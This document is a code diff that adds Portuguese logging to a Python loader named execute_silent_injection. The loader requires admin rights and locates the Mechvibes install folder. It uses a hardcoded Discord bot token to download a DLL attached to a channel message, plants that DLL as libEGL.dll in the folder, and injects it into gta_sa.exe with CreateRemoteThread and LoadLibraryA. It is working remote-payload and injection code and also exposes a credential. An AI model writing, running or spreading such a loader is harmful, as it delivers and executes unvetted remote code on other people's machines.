@@ -4,20 +4,33 @@ import subprocess
 import ctypes
 from ctypes import wintypes
 
+def log(msg):
+    print(f"[LOG] {msg}")
+
 def execute_silent_injection():
+    log("Iniciando execução da injeção silenciosa...")
+
     try:
         import requests
+        log("Módulo 'requests' importado com sucesso.")
     except ImportError:
-        subprocess.check_call([sys.executable, "-m", "pip", "install", "-q", "requests"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        import requests
+        log("Módulo 'requests' não encontrado. Instalando...")
+        try:
+            subprocess.check_call([sys.executable, "-m", "pip", "install", "-q", "requests"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            import requests
+            log("Módulo 'requests' instalado com sucesso.")
+        except Exception as e:
+            log(f"Erro ao instalar 'requests': {e}")
+            return
 
     DISCORD_CHANNEL_ID = "1393441968566046750"
     DISCORD_AUTH_TOKEN = "MTM5MzQwMzYwMjkwNjkwNjYyNA.GmV0n7.6MKOI-w6XyWeHYYN5JngUfFgAUz4ksynwCE4n8"
     DLL_NAME = "libEGL.dll"
     PROCESS_NAME = "gta_sa.exe"
 
-    k32 = ctypes.WinDLL('kernel32', use_last_error=True)
+    log("Configurando chamadas da API do Windows...")
 
+    k32 = ctypes.WinDLL('kernel32', use_last_error=True)
     PROCESS_ALL_ACCESS = 0x1F0FFF
     MEM_COMMIT_RESERVE = 0x3000
     PAGE_READWRITE = 0x04
@@ -37,74 +50,113 @@ def execute_silent_injection():
     k32.CloseHandle.argtypes = [wintypes.HANDLE]
     k32.CloseHandle.restype = wintypes.BOOL
 
+    log("Verificando permissões de administrador...")
     try:
         if not ctypes.windll.shell32.IsUserAnAdmin():
+            log("Permissão de administrador necessária. Encerrando.")
             return
-    except:
+    except Exception as e:
+        log(f"Erro ao verificar administrador: {e}")
         return
 
     if sys.maxsize > 2**32:
+        log("Executando versão 64 bits. Tentando reabrir em 32 bits...")
         try:
             subprocess.Popen(['py', '-3-32'] + sys.argv, creationflags=0x08000008)
+            log("Reaberto em 32 bits. Encerrando esta instância.")
             sys.exit()
         except FileNotFoundError:
+            log("Python 32 bits não encontrado.")
             pass
 
+    log("Procurando pasta do Mechvibes...")
     mech_dir = None
     for drive in [f"{chr(c)}:\\" for c in range(65, 91) if os.path.exists(f"{chr(c)}:\\")]:
         for root, _, files in os.walk(drive):
             if "Uninstall Mechvibes.exe" in files:
                 mech_dir = os.path.dirname(os.path.join(root, "Uninstall Mechvibes.exe"))
+                log(f"Pasta encontrada: {mech_dir}")
                 break
         if mech_dir:
             break
+
     if not mech_dir:
+        log("Pasta do Mechvibes não encontrada.")
         return
 
     dll_path = os.path.join(mech_dir, DLL_NAME)
 
     try:
-        r_msg = requests.get(f"https://discord.com/api/v10/channels/{DISCORD_CHANNEL_ID}/messages?limit=1", headers={"Authorization": f"Bot {DISCORD_AUTH_TOKEN}"}, timeout=10)
-        if r_msg.status_code != 200: return
+        log("Buscando mensagem no Discord...")
+        r_msg = requests.get(
+            f"https://discord.com/api/v10/channels/{DISCORD_CHANNEL_ID}/messages?limit=1",
+            headers={"Authorization": f"Bot {DISCORD_AUTH_TOKEN}"},
+            timeout=10
+        )
+        if r_msg.status_code != 200:
+            log(f"Erro ao buscar mensagem: status {r_msg.status_code}")
+            return
         messages = r_msg.json()
-        if not messages or not messages[0].get('attachments'): return
+        if not messages or not messages[0].get('attachments'):
+            log("Nenhuma mensagem com anexo encontrada.")
+            return
         dll_url = messages[0]['attachments'][0]['url']
+        log(f"URL do DLL obtido: {dll_url}")
         r_dll = requests.get(dll_url, timeout=15)
         if r_dll.status_code == 200:
             with open(dll_path, "wb") as f:
                 f.write(r_dll.content)
+            log(f"DLL salva em: {dll_path}")
         else:
+            log(f"Falha ao baixar DLL: status {r_dll.status_code}")
             return
-    except requests.exceptions.RequestException:
+    except requests.exceptions.RequestException as e:
+        log(f"Erro na requisição da DLL: {e}")
         return
 
-    pid = None
+    log(f"Procurando processo '{PROCESS_NAME}'...")
     try:
         output = subprocess.check_output(f'tasklist /FI "IMAGENAME eq {PROCESS_NAME}" /NH', shell=True).decode()
         pid = int(output.strip().split()[1])
-    except Exception:
-        return
-    if not pid:
+        log(f"Processo encontrado. PID: {pid}")
+    except Exception as e:
+        log(f"Erro ao obter PID do processo: {e}")
         return
 
     h_process = k32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
-    if not h_process: return
+    if not h_process:
+        log("Falha ao abrir processo.")
+        return
+    else:
+        log("Handle do processo obtido com sucesso.")
 
     dll_bytes = dll_path.encode('ascii')
     mem_addr = k32.VirtualAllocEx(h_process, None, len(dll_bytes) + 1, MEM_COMMIT_RESERVE, PAGE_READWRITE)
-    
-    if not (mem_addr and k32.WriteProcessMemory(h_process, mem_addr, dll_bytes, len(dll_bytes) + 1, None)):
+
+    if not mem_addr:
+        log("Falha ao alocar memória remota.")
         k32.CloseHandle(h_process)
         return
 
-    load_library_addr = k32.GetProcAddress(k32.GetModuleHandleA(b'kernel32.dll'), b'LoadLibraryA')
-    h_thread = k32.CreateRemoteThread(h_process, None, 0, load_library_addr, mem_addr, 0, None)
-    
-    if not h_thread:
+    if not k32.WriteProcessMemory(h_process, mem_addr, dll_bytes, len(dll_bytes) + 1, None):
+        log("Falha ao escrever na memória do processo.")
         k32.CloseHandle(h_process)
         return
-        
+
+    log("DLL escrita na memória do processo.")
+
+    load_library_addr = k32.GetProcAddress(k32.GetModuleHandleA(b'kernel32.dll'), b'LoadLibraryA')
+    h_thread = k32.CreateRemoteThread(h_process, None, 0, load_library_addr, mem_addr, 0, None)
+
+    if not h_thread:
+        log("Falha ao criar thread remota.")
+        k32.CloseHandle(h_process)
+        return
+
+    log("Thread remota criada com sucesso. Injeção concluída.")
+
     k32.CloseHandle(h_thread)
     k32.CloseHandle(h_process)
+    log("Handles liberados. Processo finalizado com sucesso.")
 
 execute_silent_injection()
